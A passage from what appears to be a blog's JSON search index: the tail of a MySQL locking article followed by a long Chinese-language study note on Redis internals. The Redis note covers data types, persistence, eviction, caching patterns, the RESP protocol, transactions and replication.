Lock：处于等待状态的需要在某个存在Gap Lock或Next-Key Lock的间隙插入记录的事务也会在内存中生成的，用来表明插入意图的锁\n隐式锁：隐式锁就是不加锁。隐式锁主要用在插入场景中。在Insert语句执行过程中，必须检查两种情况，一种是如果记录之间加有间隙锁，为了避免幻读，此时是不能插入记录的，另一中情况如果Insert的记录和已有记录存在唯一键冲突，此时也不能插入记录。除此之外，Insert语句的锁都是隐式锁，但跟踪代码发现，Insert时并没有调用lock_rec_add_to_queue函数进行加锁， 其实所谓隐式锁就是在Insert过程中不加锁。\n\nReferences\n西泽梦路. MySQL基础教程. 北京: 人民邮电出版社, 2020.1.\n小孩子4919. MySQL是怎样运行的：从根上理解MySQL. 北京：人民邮电出版社, 2020.11.\nhttps://www.bilibili.com/video/BV1Nt41177v5/?p=1&amp;vd_source=e229b568d11ab1ec4d7f50fb619a17b6\nhttps://ke.qq.com/course/230866?flowToken=1031040#term_id=100272363\n\n","categories":["IT"],"tags":["MySQL"]},{"title":"Redis","url":"/2023/05/06/Redis/","content":"数据类型5种基础数据类型string（字符串）Redis的string类似于Java的ArrayList，是动态字符串，可以被修改，采用预分配冗余空间的方式来减少内存的频繁分配。\n空间分配规则：如果字符串长度小于1MB，扩容方式是加倍现有的空间，如果字符串长度超过1MB，扩容方式是只多扩1MB的空间。\n支持的命令。\n\nmset、mget命令可以实现对多个字符串进行批量读写。\nex后缀可以在set的时候指定过期时间。\nnx后缀可以在set的时候如果key不存在才set。\n\n\n用途示例：\n\n缓存用户信息，将用户信息序列化成字符串，存入Redis缓存，取出用户信息的时候会经过一次反序列化的过程。\nRedis中所有数据结构都以唯一的字符串key作为名称。\n\nlist（列表）Redis的list类似于Java的LinkedList，是双向链表，不是数组。\n当 List 中的元素数量较少且元素都比较短时，Redis 通常会采用 ziplist 来存储；多个ziplist之间使用双向指针串联起来（避免在插入或删除数据时产生大量的内存拷贝），这种结构叫做quicklist（快速链表）。\nziplist （压缩列表）是一个特殊的双向链表（本质上是一个字节数组）。ziplist的优点是节省内存，原因是使用了紧凑的内存布局，具体表现在：\n\nziplist中的元素是连续存储的（内存分配是连续的），只需要对整个ziplist（整个ziplist包含了多个数据）进行内存对齐。\n没有使用双向指针，而是使用了Prevlen（前一个entry的长度，entry是存储数据的节点）和Entrylen（当前姐节点的长度），通过长度推算元素位置。使用Prevlen和Entrylen的内存消耗通常比使用双向指针要小，因为一个listNode指针固定占用4字节（32位操作系统下）或8字节（64位操作系统下）。\n没有使用ListNode作为存储实际数据的节点，除了Prevlen、Entrylen和Content（实际数据）外，没有其它组成部分（如内存对齐）会消耗内存。\n\n支持的命令有：rpush、rpop、lpush、lpop、lindex、lrange、ltrim等。\n用途示例：\n\nRedis 2.0 之前，如果想要使用 Redis 来做消息队列的话，只能通过 List 来实现。Redis 5.0 新增加的一个数据结构 Stream 来做消息队列。\n\nhash（字典）Redis的hash类似于Java中的HashMap，底层也是数组+链表的实现方式。不同的是Redis的hash的值只能是字符串，且rehash的方式也不一样。rehash 是指在哈希表发生扩容时进行的重新哈希操作。\nredis采用了渐进式哈希扩容的策略，通过分多次操作逐步完成整个扩容过程，避免服务阻塞的问题。具体来说，Redis 的哈希表扩容过程如下：\n\n创建新哈希表：系统会根据当前数据库的元素数量和设置的负载因子计算出扩容所需的最小桶数，然后创建一个新的哈希表，将其指针保存在旧哈希表的 rehashidx 属性中。\n\n逐步 rehash 元素：从旧哈希表中取出一个桶（或一个链表），并将其中的元素 rehash 到新哈希表中，如果新哈希表中的相应桶为空，则直接插入元素；如果不为空，则使用链表结构将其作为链表头插入。这个过程需要遍历旧哈希表中所有的非空桶，每次操作都只处理一个桶中的元素，避免一次性处理过多数据。\n\n完成 rehash：当旧哈希表中的所有元素都被 rehash 到新哈希表后，会释放旧哈希表占用的内存。\n\n\n支持的命令有：hset、hget、hlen、hgetall等。\n用途示例：\n\n缓存用户购物车信息，用户 id 为 key，商品 id 为 field，商品数量为 value。\n\n\n\nset（集合）Redis的set类似于Java的HashSet，是无序的。set的底层有两种实现，hash和intset，通常使用hash保存set数据，hash中所有的value都是NULL，如果一个set全是整数，则使用字典过于浪费内存，为此Redis设计了insert数据结构，专门用来保存整数集合数据。\n支持的命令有：sadd、scard、sismember等，scard用于获取计数值。\n用途示例：\n\n需要获取多个数据源交集、并集和差集的场景：共同好友(交集)、共同粉丝(交集)、共同关注(交集)、好友推荐（差集）、音乐推荐（差集）、订阅号推荐（差集+交集） 等\n\nzset（sorted-set，有序集合）Redis中的zset类似于Java中的LinkedHashSet，底层实现使用的是跳表（skiplist）。\nzset相比set给每个元素增加了一个score参数，按照score进行排序。\n支持的操作：\n\nzadd：向有序集合添加一个或多个成员，并指定对应的分数。\nzrank：获取成员在有序集合中的排名（从小到大）。\nzrevrank：获取成员在有序集合中的倒序排名（从大到小）。\nzrange：按照排名范围获取有序集合中的成员。\nzrevrange：按照倒序排名范围获取有序集合中的成员。\nzscore：获取成员的分数。\nzincrby：增加成员的分数。\nzrem：从有序集合中移除一个或多个成员。\nzcard：获取有序集合元素的总和\n\n用途示例：\n\n用在各种排行榜的场景，比如朋友圈的微信步数排行榜（value是用户id，score是步数，按照score排序），直播间送礼物的排行榜，王者荣耀中的段位排行榜，话题热度排行榜。\n\n容器型数据结构的创建和删除规则list、set、hash、zset这四种数据结构都是容器型数据结构，容器型数据结构遵从以下两条规则创建和删除规则：\n\ncreate if not exists：如果添加元素时容器不存在，就创建。\ndrop if no elements：如果容器里没有元素，那么立即删除容器释放内存。\n\n高级数据类型Bitmap（位图）Redis提供了位图数据结构（不是全新的数据结构，底层其实是string字符串）。位图的最小单位是比特（0或1）。\n支持的命令有：getbit、setbit、bitcount、bitpos、bitfield等。\nbitcount用来统计指定范围内1的个数。\nbitops用来查找指定范围内出现的第一个0或1的位置。\nbitfield命令可以实现一次性对指定位片段进行多位操作，bitfield有三个子命令，get、set、incrby。如果使用incrby命令时出现了溢出，Redis默认的处理方式是折返（wrap），即不对溢出进行特殊处理，溢出之后是什么值就取什么值。Redis的bitfield命令选择溢出策略的子命令是overflow，用户可以选择溢出行为，包括折返、失败（fail，报错并不予执行）、饱和截断（sat，超过了范围就停留在最大或最小值）。\n用途示例：\n\n对于一些需要存储大量bool（布尔类型，只需要使用一位比特）型数据的情况（比如一年内的签到数据），如果使用普通的key-value，存储空间消耗极大。为解决这个问题，可以使用位图。\n\nGeospatial（地理空间）Redis的Geospatial可以实现存储和搜索坐标，适用于查找给定半径或边界框内的附近点，存在于Geo模块（处理地理位置信息的模块）中，底层使用的是zset。\nGeospatial底层使用了GeoHash算法，GeoHash算法将二维的经纬度数据映射到一维的整数（使用二刀法等刀法实现），要寻找二维空间下的附近点时，只需要找映射后的一维坐标下的附近点。计算后的地图元素的坐标都会变为整数，通过这个整数可以还原出元素的坐标，整数越长，坐标值的损失程度越小。\n支持的命令有：geoadd、geosearch等。\n用途示例：\n\n可以用于实现“附近的单车”、“附近的餐馆”这样的需要对地理位置距离进行搜索的功能。\n\nHyperLogLog（基数概率计数）HyperLogLog 是一种概率数据结构，用于估计集合的基数。作为一种概率数据结构。 Redis的HyperLogLog 实现最多使用 12 KB，并提供 0.81% 的标准错误。\nHyperLogLog之所以内存消耗如此之小，是因为HyperLogLog的存储算法具备这一特点：\n\n当计数比较小时，它的存储空间采用稀疏矩阵存储。\n计数值增大到稀疏矩阵占用空间超过阈值后，才会一次性转变为稠密矩阵，占用12KB。\n\n支持的命令有：pfadd、pfcount、pfmerge等。pfadd用来添加数据，pfcount用来获取计数值，pfmerge用来合并HyperLogLog。\n用途示例：\n\n统计UV，由于统计UV需要去重，所以简单的方案是使用set，但是如果页面访问量很大，就存在浪费存储空间的问题。要统计网站上每个网页每天的UV数据总数，数据不需要太精确。更好的解决方案是使用提供了不精确的去重计数方案HyperLogLog。HyperLogLog的标准误差是0.81%，这样的精确度可以满足UV统计需求，并且，HyperLogLog 使用的内存消耗最多是12 KB，无论估算的基数有多大，它始终只占用 12 KB 的内存空间。\n补充：\n\nUV（Unique Visitor）数据指的是网站或应用程序的独立访问者数量。UV数据用于衡量网站或应用程序的受众规模和用户活跃度。UV数据通常基于用户的唯一标识符（如用户ID、Cookie、设备ID等）进行统计，以便区分不同的访问者。它可以帮助网站或应用程序的管理者了解其用户群体的规模、用户活跃度、用户留存率等重要指标，从而做出相应的优化和决策。\n\nPV（Page View）数据指的是网站或应用程序的页面访问次数。PV数据记录了每个页面被访问的次数，无论是同一个用户多次访问同一个页面，还是不同用户访问同一个页面，每一次访问都计算为一次PV。PV数据可以帮助评估网站或应用程序的流量、页面热度以及用户行为。\n\n\n\n\nBloom Filter（布隆过滤器）布隆过滤器是一种概率数据结构，用于检查集合中是否存在元素。\nRedis的布隆过滤器是从Redis4.0开始以插件的形式添加到Redis中的，要使用Redis的布隆过滤器，需要安装对应插件。\n虽然HyperLogLog能够对数据进行去重计数，但是不能用来判断数据是否已存在。Bloom Filter就是主要用来判断对象是否存在的，相比set能够节省90%的空间，唯一不足是不精确，有一定的误判概率。在使用时，布隆过滤器的initial_size（预计放入的元素数量）参数越大，error_rate（误判率）越小。\n布隆过滤器的原理：\n布隆过滤器底层的数据结构是一个大型的位数组，添加key时，使用几个不同的无偏hash函数（所谓无偏就是能够把元素的hash值算得比较均匀，让key被hash映射到位数组中的位值比较随机），对添加到布隆过滤器的key进行hash，分别算出索引值，然后将索引值位置的值置为1。判断key是否存在时，对添加到布隆过滤器的key进行hash，分别算出索引值，然后看位数组中这几个位的值是否都是1，如果都是1，说明极有可能存在，如果不都是1，说明一定不存在。\n布隆过滤器判断结果的真实性的规则：\n\n如果布隆过滤器输出某个值存在，这个值可能不存在\n如果布隆过滤器输出某个值不存在，这个值一定不存在\n\n布隆过滤器的空间占用估计：\n使用布隆过滤器需要提供两个参数，位数组的长度和hash函数的数量，要计算出这两个参数合适的取值，需要进行空间占用估计，设定预计的元素的数量和错误率。\n元素的数量（设为n），错误率（设为p），位数组的长度（设为m）和hash函数的数量（设为k）之间的关系是：\n\nk &#x3D; 0.7 * (m &#x2F; n)\n\np &#x3D; 0.6185 ^ (m &#x2F; n)\n\n\n可见，hash函数的最佳数量和（位数组的长度&#x2F;元素的数量）成正比，错误率和（位数组的长度&#x2F;元素的数量）成反比。\n当实际元素数量超过设置的预计元素的数量，错误率会有陡峭的增大，设实际元素数量和设置的预计元素的数量比值为T，使用的hash函数的数量是K，错误率（设为F）的计算公式是：\nF = (1 - 0.5^T) ^ K;\n\n要计算这两个参数，可以使用在线计算布隆过滤器计算器，使用示例如下：\n\n用途示例：\n\n在爬虫系统中对URL进行去重。\n在NoSQL数据库中通过内存中的布隆过滤器过滤掉不存在的row的请求。\n邮箱系统的垃圾邮件过滤。\n\n支持的命令有：bf.add（一次添加一个元素）、bf.madd（一次添加多个元素）、bf.exists等。\nStream（流）Redis Stream是Redis 5.0版本中新增的数据类型，可用于实现支持多播、可持久化的消息队列。\n支持的操作有：xadd、xdel、xrange、xread、xreadgroup等。\nStream由以下三部分构成：\n\n消费组\n\n每个Stream都可以挂载多个消费组（Consumer Group），每个消费组会有一个游标（last_delivered_id），用于表示当前消费组以及消费到哪条消息。\n消费组之间是独立的。\n一个消费组可以挂载多个消费者，任意一个消费者读取了消息都会使游标向前移动。\n\n创建消费组\n创建消费组的命令是xgroup create，创建消费组需要提供起始消息 ID 参数用来初始化 last_delivered_id 变量。\n\n独立消费\n可以不定义消费组，将 Stream 当成普通的消息队列（list）来使用。\n\n\n\n消息\n\n消息ID\n消息 ID 的形式是 TimestampInMillis-sequence，例如 1527846880572-5，它表示当前的消息在毫秒时间戳 1527846880572 时产生，并且是该毫秒内产生的第 5 条消息。消息 ID 可以由服务器自动生成，也可以由客户端自己指定，但是形式必须是 “整数-整数”，而且后面加入的消息的 ID 必须要大于前面的消息 ID。\n\n消息内容\n消息内容的形式的键值对。\nStream的消息有定长的功能，在 xadd 的指令中提供了一个长度参数 maxlen，就可以实现清除旧有超长的消息。\n\n\n\n消费者\n\npending_ids\n每个消费者中维持一个状态变量pending_ids，简称为PEL(Pending Entries List)，记录了当前已经被客户端读取的但尚未被ACK的消息。\n\n消息ID可以指定读取的起始位置，如0表示从最早的消息开始读取，或者使用特殊符号&gt;表示从当前最新的消息开始读取。\n\n处理完消息后，消费者需要使用XACK命令确认消息的处理完成。\n\n\n\n\n在Stream出现之前，Redis中支持消息多播的模块是PubSub（PublisherSubscriber，发布者-订阅者）。\n消息多播允许生产者只生产一次消息，由中间件负责将消息复制到多个消息队列，每个消费队列由对应的消费组进行消费。这是分布式系统常用的一种解耦方式，用于将多个消费组的逻辑进行拆分。\nPubSub的缺点是当生产者发送消息时，如果消费者下线没有收到消息，那么该消息对于该消费者来说就是彻底丢失了正式因为PubSub有这个缺点，在消息队列的领域几乎找不到合适的应用场景。Redis5.0新增了Stream数据结构，给Redis带来了持久化的消息队列，从此PubSub退出作为消息队列的技术方案选项。\n补充info指令\ninfo stats：查看Redis 每秒执行多少次指令。\ninfo clients：查看Redis 连接了多少客户端。\nrejected_connections：查看因为超出大量连接限制而被拒接的客户端连接次数。如果这个数字很大意味着服务器的最大连接数设置的过低，需要调整 maxclients 参数。其默认值为 1w。\ninfo memory：查看Redis 内存占用多大、使用的内存分配库等信息\ninfo replication：查看复制积压缓冲区大小\n\nscanscan是一个Redis命令，用于从海量的key中找出满足特定key（特定前缀的key、大key等）列表。相比Redis之前提供的keys命令（也可以完成这一功能）scan具备以下特点：\n\n虽然复杂度也是O(n)，但它是通过游标分步进行的，不会阻塞线程\n提供了limit参数，可以控制服务器单次遍历的最大条数\n返回的结果可能有重复（key存储在hash中，hash缩容时会重复遍历正在遍历的槽），需要客户端去重\n\nscan指令返回的游标就是第一维数组的位置索引（槽，slot），limit参数就表示需要遍历的槽位数\nscan的遍历顺序是高进位加法，高进位加法从左边加，进位往右边移动。\n对于rehash中的字典，scan会同时访问新旧两个数据结构\n除了有可以遍历key的scan指令外，还有针对其它容器集合的遍历操作：\n\nsscan：遍历set集合\nzscan：遍历zset集合\nhscan：遍历hash字典中的元素\n\nscan查找大key的方法是对于每个扫描出来的key，使用type指令获得key的类型，然后使用相应数据结构的size或len方法来得到value的大小，对于每一种类型，将大小排名的前若干名作为扫描结果输出。要编写上面过程的脚本比较繁琐，不过Redis官方已经在redis-cli指令中提供了这样的扫描功能。\n示例如下：\nredis-cli -h 127.0.0.1 -p 6379 --bigkeys\n\n还可以限制扫描的执行时间：\nredis-cli -h 127.0.0.1 -p 6379 --bigkeys -i 0.1\n\n上面这条指令使用-i选项限制每个SCAN命令的延迟时间应不超过0.1秒。\n补充：\n大key：指的是key对应的value值大，在实际业务中要尽量避免大key的产生，原因是大key会带来如下坏处：\n\n请求阻塞：redis为单线程，读、写或删除大key需要较长的处理时间，会阻塞后续的请求处理。\n网络阻塞：大key会明显需要更长的传输时间，在整个传输时间内，占用大量的带宽，导致网络阻塞。\n占用内存：大 key 在 Redis 内部通常会占用较多的内存空间，导致 Redis 的整体内存使用率变高，可能会引起内存溢出等问题。\n\n过期时间Redis中所有对象都可以设置过期时间。例如，可以对一个hash对象设置过期时间，但是不能只对某一个key-value设置过期时间。需要注意的是，如果一个对象已经设置了过期时间，然后调用set修改了这个对象，那么之前设置的过期时间就会失效。\n持久化RDB日志（内存快照）RDB（Redis DataBase）日志（内存快照）是内存数据的二进制序列化，是全量备份。\n内存快照要求Redis必须进行文件IO操作，而Redis是单线程程序，如果一边处理业务请求，一边进行文件IO操作，会降低处理业务请求的性能，还有个问题是，这种操作下，内存数据一边被持久化一边被修改，快照就不是对一个时间点的记录，而是成了多个时间点交错的记录，无法使用。\nRedis使用操作系统多进程COW（Copy On Write）机制来实现快照持久化。\nCopy-On-Write（COW）是一种操作系统中常用的技术，其基本思想是：当多个进程需要访问同一块内存地址时，操作系统会将这块内存标识为只读，并且在任何进程试图写入该内存前，都会复制一份副本供该进程使用。这样就能够保证每个进程都拥有自己的独立内存空间，而不会互相干扰。\nAOF日志AOF（Append Only File）日志是内存数据修改的指令记录文本，是增量备份。\nRedis收到客户端的修改命令后，进行参数校验、逻辑处理，如果没问题，就执行该指令，然后将该指令文本存储到AOF日志中，即先执行指令再将指令存储到AOF日志。\nAOF日志在长期的运行过程中会变得十分庞大，数据库重启时需要加载AOF日志进行指令重放，这个过程就会很漫长，所以需要定期进行AOF重写，给AOF日志进行瘦身。Redis提供了bgrewriteaof命令用于对AOF日志进行瘦身，其原理是开辟一个子进程对内存进行遍历，转换成一系列Redis的操作命令，序列化到一个新的AOF日志文件中，序列化完成后再将操作期间发生的增量AOF日志追加到这个新的AOF日志文件中，追加完毕后就可以替代旧的AOF日志文件了。\n当程序对AOF日志文件进行写操作时，实际上是将内容写到了以内核为文件描述符分配的一个内存缓存中，然后内核会异步地将脏数据刷回到磁盘。这就意味着，如果突然宕机，AOF日志还没有完全刷新到磁盘中，就会出现日志丢失。Linux的glibc提供的fsync(int fd)函数可以将指定文件的内容强制从内核缓存刷新到磁盘，只要Redis进行实时调用fsync函数就可以保证AOF日志不丢失。但是fsync是一个磁盘IO操作，很慢，如果Redis执行一条指令就要fsync一次，那么会严重降低Redis的性能。所以在生产环境的服务器中，Redis通常是每隔1s左右执行一次fsync操作，这个1s的周期是可以配置的，是在安全性和性能间做的折中。\n因为RDB和AOF都会加重系统的负担，所以通常Redis的主节点不会进行持久化操作，持久化操作主要在从节点进行，这是因为从节点没有来自客户端请求的压力，系统资源充足。\n混合持久化使用RDB恢复内存状态会丢失备份后修改的数据，而使用AOF日志的全量文件重放又相对RDB慢很多，Redis为解决这个问题，从Redis4.0开始，引入了一个新的持久化选项，混合持久化。\n混合持久化的持久化方式是指生成RDB全量日志和该RDB的AOF增量日志，在Redis重启的时候，先加载RDB日志，再加载AOF日志。\n内存管理内存分配Redis在内存分配方面，直接使用了第三方的内存分配库，目前Redis使用jemalloc（是Facebook开发的）库来管理内存，也可以切换到tcmalloc（是Google开发的），因为jemalloc比tcmalloc性能稍好，所以Redis默认使用jemalloc进行内存分配。\n通过info memory可以查看Redis使用的是哪个第三方的内存分配库。\n数据删除定时删除EXPIRE命令可以为指定的键设置过期时间，时间到达后，这些建会被自动删除。\nserverCron函数会定时触发expire.c下的activeExpireCycle函数，该函数会清除数据库中的过期数据，该函数可以设置最长执行时间和每次删除操作删除的最大的key数量。以避免删除操作延时过长。\n惰性删除惰性删除是当用户查询键时，检测键是否过期，如果键已经过期，则删除该键。该操作由expireIfNeeded函数完成。\n内存回收被删除的key分散在很多页面中，这个页面可能还有其它正在使用的key，操作系统是以页为单位进行内存回收的，这个页上只要还有一个key在使用，那这个页就不能回收。\nRedis虽然无法保证立即回收已经删除key的内存，但是它会重新使用那些尚未回收的空闲内存。\n数据淘汰策略Redis官方给出的数据淘汰策略（Eviction policies）文档给出Redis支持的数据淘汰策略包括：\n\nnoeviction: New values aren’t saved when memory limit is reached. When a database uses replication, this applies to the primary database\nallkeys-lru: Keeps most recently used keys; removes least recently used (LRU) keys\nallkeys-lfu: Keeps frequently used keys; removes least frequently used (LFU) keys\nvolatile-lru: Removes least recently used keys with the expire field set to true.\nvolatile-lfu: Removes least frequently used keys with the expire field set to true.\nallkeys-random: Randomly removes keys to make space for the new data added.\nvolatile-random: Randomly removes keys with expire field set to true.\nvolatile-ttl: Removes keys with expire field set to true and the shortest remaining time-to-live (TTL) value.\n\nLRULRU（Least Recently Used）：如果一个数据在最近一段时间内（LRU记录的是时间戳）没有被访问，那么可以认为它未来被访问的概率很小。当空间满时，最久没有访问的数据会最先被淘汰。\nRedis中使用的LRU算法是一种近似LRU算法，没有维护key的被访问时间顺序，而是采用随机采样出N个（比如5个，可以设置），然后淘汰掉最旧的key，为能够识别出key的访问时间，Redis给每个key增加了一个额外的字段，最后一次被访问的时间戳。\nLFULFU（Least Frequently Used）：如果一个数据在最近一段时间内很少（LFU记录的是使用次数）被访问，那么认为将来它被访问的可能性很小。当空间满时，最小频率访问的数据最先被淘汰。\nRedis会根据键的空闲时间对LFU计数进行衰减。\n三种并发读写场景中的缓存模式旁路缓存（Cache-Aside）模式读写缓存或数据库的操作都在应用程序中完成。是业务系统最常用的缓存模式。\n读操作的流程：\n\n先从缓存中查找数据。\n如果数据存在，则返回数据。\n如果数据不存在，则从数据库中查找数据，并存入缓存中，然后返回数据。\n\n写操作的流程：\n\n先写入数据库。\n再删除缓存。\n\n旁路缓存模式在写入的时候，为什么是先写入数据库再删除缓存，为什么是删除缓存而不是更新缓存？要回答这些问题，需要就不同的策略逐个进行分析，寻找不足。\n\n先删除缓存再更新数据库（解答为什么是先写入数据库再删除缓存）\n如果按照先删除缓存，再更新数据库的策略，会出现如下操作顺序（A，B是两台微服务，A执行更新操作，B执行读取操作）：\n\nA删除缓存\nB从数据库读取数据\nB更新缓存（缓存中的数据最终是A更新数据库前的数据）\nA更新数据库（数据库中的数据是A更新的数据）\n\n出现数据库和缓存数据不一致的问题，且问题会一直持续下去，直到不再出现这种操作顺序。\n\n先更新数据库，再更新缓存而不是删除缓存（解答为什么是删除缓存而不是更新缓存）\n如果按照更新缓存而不是删除缓存的策略，会出现如下操作顺序（A，B是两台微服务，A和B都执行更新操作）：\n\nA更新数据库\nB更新数据库（数据库中的数据最终是B更新的数据）\nB更新缓存\nA更新缓存（缓存中的数据最终是A更新的数据）\n\n出现数据库和缓存数据不一致的问题，且问题会一直持续下去，直到不再出现这种操作顺序。\n\n先更新数据库再删除缓存（旁路缓存模式）\n先更新数据库再删除缓存，基本上可以解决并发读写场景中缓存和数据库中的数据不一致的问题。但是，在一些特殊场景中，还是会存在数据不一致的问题。这种特殊的场景就是，更新完数据库后，删除缓存的操作出现卡顿，导致其它服务读取到的数据不是数据库中最新的数据。\n如果出现这种特殊场景，那么操作顺序如下（A，B是两台微服务，A执行更新操作，B执行读取操作）：\n\nA更新数据库\nB从缓存中查询数据（仅仅可能出现短暂的不一致，下一步A删除缓存后又能重新保证数据库和缓存中数据的一致）\nA删除缓存\n\n出现数据不一致的时间仅仅是执行更新数据库和删除数据库之间短暂的时间长度，这种数据不一致不会一致持续下去，删除缓存执行完毕后又会重新保证数据的一致性。\n\n\n读&#x2F;写穿透（Read&#x2F;Write Through）模式读写缓存或数据库的操作不在应用程序中完成，而是在一层独立的缓存程序Cache Provider中完成。能够让应用程序代码更简洁，同时也减少了数据库的负载。适合写操作多，数据一致性要求高的场景，在银行系统中应用较多。\n读操作的流程：\n\n应用程序向Cache Provider查询数据。\n由Cache Provider按照和旁路缓存模式的读操作流程一样的流程读取数据。\n\n写操作的流程：\n\n应用程序向Cache Provider写入数据。\nCache Provider先写入缓存，再写入数据库。\n\n异步回写（Write Behind）模式在写入时，异步回写模式只更新缓存，不同步更新数据库，而是异步批量写入数据库，读&#x2F;写穿透模式是同步更新缓存和数据库。所以异步回写模式性能高，但是可能会丢失数据，数据可靠度低，非常适合一些数据变化频繁，又对数据一致性要求没那么高的场景，如浏览量、点赞量。\n数据传输Redis序列化协议（RESP）RESP是Redis序列化协议（Redis Serialization Protocal）的简写，是一种直观的文本协议。\nRESP将传输的数据分为5种最小单元类型，单元结束时统一加上回车换行符号\\r\\n。单元开始时使用符号标识不太的数据类型：\n\nFor Simple Strings, the first byte of the reply is “+”\nFor Errors, the first byte of the reply is “-“\nFor Integers, the first byte of the reply is “:”\nFor Bulk Strings（批量字符串）, the first byte of the reply is “$”. A “$” byte followed by the number of bytes composing the string (a prefixed length), terminated by CRLF.\nFor Arrays, the first byte of the reply is “*“\n\nNULL用多行字符串表示，不过长度要写成-1：\n$-1\\r\\n\n\n客户端向服务端发送的指令只有一种格式，多行字符串数组。比如指令set author codehole会被序列化为下面的字符串：\n*3\\r\\n$3\\r\\nset\\r\\n$6\\r\\nauthor\\r\\n$8\\r\\ncodehole\\r\\n\n\n服务端向客户端返回的数据结构有的比较复杂，不过也是以上五种基本类型的组合。例如scan命令的返回给客户端的结果，scan命令返回的是一个嵌套数组，数组的第一个值表示游标的值，如果这个值为零，说明已经遍历完毕。scan返回结果示例：\n*2\\r\\n$1\\r\\n0\\r\\n*3\\r\\n$4\\r\\ninfo\\r\\n$5\\r\\nbooks\\r\\n$6author\\r\\n\n\n里面嵌套了一个数组\n*3\\r\\n$4\\r\\ninfo\\r\\n$5\\r\\nbooks\\r\\n$6author\\r\\n\n\n虽然RESP协议里面有大量冗余的回车换行符，但是依然是非常受欢迎的一个文本协议。\n管道（Pipeline）Redis管道通过将多个命令打包在一起，然后一次性发送给Redis服务器，在一次通信中获得多个命令的执行结果。这样就可以减少通信次数，提高性能。\nRedis的管道不是由Redis服务器提供的技术，而是由客户端提供的。\n使用Redis自带的压力测试工具redis-benchmark,，可以测试出设置不同的单个管道内并行的请求数量所带来的QPS（Queries Per Second，每秒查询率）的改变。\nI&#x2F;O模型5种常见的IO模型\n阻塞IO模型\n 当我们调用套接字的读写放方法，默认是阻塞的，read操作是在没有读取到字节时线程阻塞，write操作是在写缓冲区已满时阻塞。\n 典型应用：BIO（Blocking I&#x2F;O）\n\n非阻塞IO模型\n 非阻塞IO在套接字对象上设置了non_blocking，读写方法不会阻塞，会反复地发起读&#x2F;写请求，对于read操作，当内核准备好数据之后就进行读，对于写操作，当写缓冲区的有空闲空间就进行写。\n 典型应用：Java NIO（Non-blocking I&#x2F;O，New I&#x2F;O）\n\n多路复用IO模型\n 一种简单的多路复用API是select，多个的进程的IO注册到一个复用器（select）上，然后用一个进程调用该select，select会监听所有注册进来的IO。\n 如果select没有监听的IO在内核缓冲区都没有可读数据，select调用进程会被阻塞；而当任一IO在内核缓冲区中有可数据时，select调用就会返回；\n 典型应用：epoll（linux系统的性能最好的多路复用API）。\n\n信号驱动IO模型\n 当进程发起一个IO操作，会向内核注册一个信号处理函数，然后进程返回不阻塞；当内核数据就绪时会发送一个信号给进程，进程便在信号处理函数中调用IO读取数据。\n\n异步IO模型\n 当进程发起一个IO操作，进程返回（不阻塞），但也不能返回结果；内核把整个IO处理完后，会通知进程结果。如果IO操作成功则进程直接获取到数据。\n\n同步指的是在发出一个功能调用时，在没有得到结果之前，该调用就不返回。也就是必须一件一件事做，等前一件做完了才能做下一件事。\n异步的概念和同步相对，当一个异步过程调用发出后，调用者不需要立刻得到结果。调用被执行完成后，会通知调用者。\n\n 典型应用：Java AIO（Asynchronous I&#x2F;O）\n\n\n\nRedis使用的IO模型Redis使用的是多路复用IO模型，在Linux环境下具体使用的API是epoll。epoll 可以高效地管理大量的文件描述符上的事件，获取事件的时候，不需要遍历整个文件描述符集合，只是遍历那些被内核IO事件异步唤醒而加入Ready队列的文件描述符集合。epoll没有最大文件描述符的限制，上限是最大可以打开文件的数目。\n事务Redis的事务不具备原子性，仅仅实现了事务的“串行化”，当前执行的事务不被其它的事务打断。Redis的事务通常会结合pipeline一起使用，可以将多次IO操作合并为一次。在Python的Redis客户端，Redis执行事务时要强制使用pipeline。\nRedis事务的操作指令有multi、exec、discard、watch。分别表示事务的开始、提交、丢弃、监视变量。所有指令在exec之前不会执行，而是缓存在服务器的事务队列中。执行完毕后一次性返回所有指令的运行结果。\n在 Redis 中，watch命令用来监视某个键，在服务器收到exec命令将要执行缓存的事务队列时，Redis会检查自变量被watch之后是否被改过。如果该键watch之后和exec之前被修改过，exec就会返回 NULL告诉客户端事务执行失败，这个时候客户端一般会选择重试。需要注意的是，Redis禁止在multi和exec之间执行watch命令，必须在multi之前watch变量。\n使用示例：\npublic class WatchUsage &#123;    public static String keyFor(String userId) &#123;        return String.format(&quot;account_%s&quot;, userId);    &#125;    public static int doubleAccount(Jedis jedis, String userId) &#123;        String key = keyFor(userId);        while (true) &#123;            //监视变量key            jedis.watch(key);            int value = Integer.parseInt(jedis.get(key));            value &lt;&lt;= 1; //乘以2            //事务开始            Transaction transaction = jedis.multi();            transaction.set(key, String.valueOf(value));            //事务提交            List&lt;Object&gt; result = transaction.exec();            if (result != null) &#123;                break;            &#125;        &#125;        return Integer.parseInt(jedis.get(key));    &#125;    public static void main(String[] args) &#123;        Jedis jedis = new Jedis();        String userId = &quot;1001&quot;;        String key = keyFor(userId);        jedis.setnx(key, String.valueOf(5));        System.out.println(doubleAccount(jedis, userId));        jedis.close();        /*        输出结果：        \t10        */    &#125;&#125;\n\n集群主从同步（主从复制）异步复制和同步复制异步复制下的分布式Redis系统不满足CAP理论中的一致性（C，Consistency）。\n同步复制：Redis3.0之后增加了wait指令，可以将主从复制由异步改为同步，可以设置需要同步的从节点的数量和最长等待时间（-1表示无限等待）。\nRedis支持主从同步和从从同步（用以减轻主节点同步的负担）。\n快照（RDB）同步快照同步是在主节点上进行一次bgsave，将当前内存的数据快照存储到磁盘，再将快照文件传输到从节点，从节点接收完毕后，执行全量加载，加载完毕后通知主节点进行增量同步。\n进行快照同步时，文件IO操作十分耗时，且会影响fsync的执行，所以从Redis2.8.18开始支持无盘复制，主服务器通过套接字直接将内存中的快照发送给从节点，由从节点将接收到的快照存储到硬盘文件。\n增量（AOF）同步Redis增量同步同步的是指令流，主节点会将那些对自己的状态产生修改性影响的指令记录在本地的内存buffer中，然后异步地将buffer中的指令同步到从节点。\nRedis的buffer是一个定长的环形数组，如果数组内容满了，就会从头开始覆盖前面的内容，如果因为网络状况不好等原因没有及时的同步，那么没有同步的指令可能会被后续的指令覆盖，此时就需要使用快照同步。如果进行快照同步的过程中，buffer又发生了覆盖，就会引发又一次的快照同步，所以如果buffer大小设置不当，可能引起快照同步的死循环。\n增加节点后的同步方式当节点添加到集群，会先进行一次快照同步，完成后再继续进行增量同步。\n哨兵模式的主从复制集群Sentinel作用Redis提供的Sentinel（哨兵）具体作用如下：\n\n监控节点状况：持续监控主、从节点的在线状况。\n故障转移，主节点发生故障后。如果主节点下线，则选举新的主节点，并自动